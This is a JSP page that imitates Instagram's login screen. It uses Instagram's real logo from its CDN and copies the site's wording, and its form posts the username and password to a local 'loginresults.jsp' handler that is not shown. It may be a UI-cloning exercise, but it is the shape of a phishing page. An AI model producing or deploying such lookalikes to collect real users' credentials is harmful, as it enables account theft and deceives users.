<%@ page language="java" contentType="text/html; charset=UTF-8"
	pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram Login page</title>
<!-- Include Tailwind CSS -->
<link
	href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css"
	rel="stylesheet">
</head>
<body class="bg-gray-100 flex items-center justify-center h-screen">
	<div class="bg-white p-6 rounded shadow-md w-full sm:w-1/2 lg:w-1/3">
		<div class="text-2xl font-semibold mb-6 text-center"
			aria-disabled="false" role="button" tabindex="0"
			style="cursor: pointer;">
			<i data-visualcompletion="css-img" aria-label="Employee Login"
				class="" role="img"
				style="background-image: url(&quot;https://static.cdninstagram.com/rsrc.php/v3/yx/r/WtxJZZ3-9ZP.png&quot;); background-position: 0px 0px; background-size: 176px 186px; width: 174px; height: 50px; background-repeat: no-repeat; display: inline-block;"></i>
		</div>

		<form action="loginresults.jsp" method="post">
			<div class="mb-4">


				<input type="text" id="username" name="username"
					class="w-full px-4 py-2 border rounded focus:outline-none focus:ring focus:border-blue-300"
					placeholder="phone number,email or username">
			</div>
			<div class="mb-6">

				<input type="password" id="password" name="password"
					class="w-full px-4 py-2 border rounded focus:outline-none focus:ring focus:border-blue-300"
					placeholder="password">
			</div>
			<div class="flex justify-center mb-4">
				<button type="submit"
					class="bg-blue-500 hover:bg-blue-700 text-white font-bold w-full py-2 px-4 rounded focus:outline-none focus:shadow-outline">Login</button>
			</div>

			<p class=" mb-4">-----------------------------OR-------------------------------------</p>
			<div class="line ">
				<span class="arrow"></span> <span class="content"></span> <span
					class="arrow"></span>
			</div>
			<div class="flex justify-center text-blue-900 font-bold">

				<svg class="w-6 h-6 text-blue-600 fill-current">
                    <path
						d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" /> 
                    </svg>
				<span> Log in with Facebook</span>

			</div>
			<div class="flex justify-center mb-8">
				<a href=# class="text- mb-8">Forgot password?</a>
			</div>

			<div class="flex justify-center mt-3">
				<p>
					Don't have an account? <a href=# class="text-blue-600 font-bold">Sign
						up</a>
				</p>
			</div>


		</form>
	</div>
</body>
</html>

